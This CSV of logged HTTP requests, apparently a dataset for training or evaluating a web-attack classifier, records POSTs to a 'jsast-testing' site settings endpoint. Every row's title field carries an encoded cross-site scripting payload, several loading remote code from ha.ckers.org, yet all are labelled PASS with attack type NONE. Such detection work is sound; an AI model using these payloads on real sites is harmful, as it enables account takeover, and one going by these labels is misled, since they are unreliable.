request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,decision,threat_score,confidence,attack_type,model_version
0c37ec33f5957668116d90064a6c1893,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bBGSOUND%20SRC%3d%5c%22javascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,296,172.19.3.26,59740,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.475,0.525,NONE,rf-realistic-v1
0b29b5ba929d8a9d6c5f9e0c5e6132ed,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bBR%20SIZE%3d%5c%22%26%7balert('XSS')%7d%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,276,172.19.3.26,59816,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.475,0.525,NONE,rf-realistic-v1
be13c9d988e2c6cc25cdfc978826e58e,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bLAYER%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fscriptlet%26%2346%3bhtml%5c%22%26gt%3b%26lt%3b%2fLAYER%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,361,172.19.3.26,59782,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
6a86e7bfac77f292ffcc805f73a1d612,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bSTYLE%26gt%3b@import'http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bcss'%3b%26lt%3b%2fSTYLE%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,345,172.19.3.26,59754,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
602fc863c6cfce825a0ac3da4431defa,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bSTYLE%26gt%3bBODY%7b-moz-binding%26%2358%3burl(%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxssmoz%26%2346%3bxml%23xss%5c%22)%7d%26lt%3b%2fSTYLE%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,392,172.19.3.26,59766,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
602c089a1d8be5571161327044f9a5bd,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bLINK%20REL%3d%5c%22stylesheet%5c%22%20HREF%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bcss%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,361,172.19.3.26,59772,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
d915e5ad2c411570483561bce84f0abe,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bMETA%20HTTP-EQUIV%3d%5c%22Link%5c%22%20Content%3d%5c%22%26lt%3bhttp%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bcss%26gt%3b%3b%20REL%3dstylesheet%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,403,172.19.3.26,59742,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
5d477db9a49e71e188afa91c219ee675,"Wed, 10 Jun 2026 09:25:33 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bLINK%20REL%3d%5c%22stylesheet%5c%22%20HREF%3d%5c%22javascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,325,172.19.3.26,59798,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.475,0.525,NONE,rf-realistic-v1
2b3d5af0fa188d63b73922b610f1d9cb,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bSTYLE%26gt%3bli%20%7blist-style-image%26%2358%3b%20url(%5c%22javascript%26%23058%3balert('XSS')%5c%22)%3b%7d%26lt%3b%2fSTYLE%26gt%3b%26lt%3bUL%26gt%3b%26lt%3bLI%26gt%3bXSS&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,394,172.19.3.26,59806,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.475,0.525,NONE,rf-realistic-v1
cdef0bd68c9f517cd95835069f0a7450,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bIMG%20SRC%3d'vbscript%26%23058%3bmsgbox(%5c%22XSS%5c%22)'%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,288,172.19.3.26,59740,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
8976770c8db72326e2a23b494428b135,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=�scriptualert(EXSSE)�%2fscriptu&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,246,172.19.3.26,59754,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.19,0.81,NONE,rf-realistic-v1
19d0d3d048a6af697b746ef96e52cc55,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bXSS%20STYLE%3d%5c%22behavior%26%2358%3b%20url(xss%26%2346%3bhtc)%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,304,172.19.3.26,59790,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
3097faf42ac27b64e76c9e0008249b02,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bIMG%20SRC%3d%5c%22livescript%26%23058%3b%26%2391%3bcode%26%2393%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,303,172.19.3.26,59782,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
49f3b01a27489338949087dbefa27f54,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bIMG%20SRC%3d%5c%22mocha%26%2358%3b%26%2391%3bcode%26%2393%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,297,172.19.3.26,59816,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.455,0.545,NONE,rf-realistic-v1
13456a52bfcc5d26da276cccabb2ba45,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bMETA%20HTTP-EQUIV%3d%5c%22refresh%5c%22%20CONTENT%3d%5c%220%3burl%3djavascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,342,172.19.3.26,59766,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.475,0.525,NONE,rf-realistic-v1
f9af7bf403b277b7f1e5cda1b76d2349,"Wed, 10 Jun 2026 09:25:34 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26lt%3bIFRAME%20SRC%3d%5c%22javascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b%26lt%3b%2fIFRAME%26gt%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,320,172.19.3.26,59798,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",PASS,0.475,0.525,NONE,rf-realistic-v1
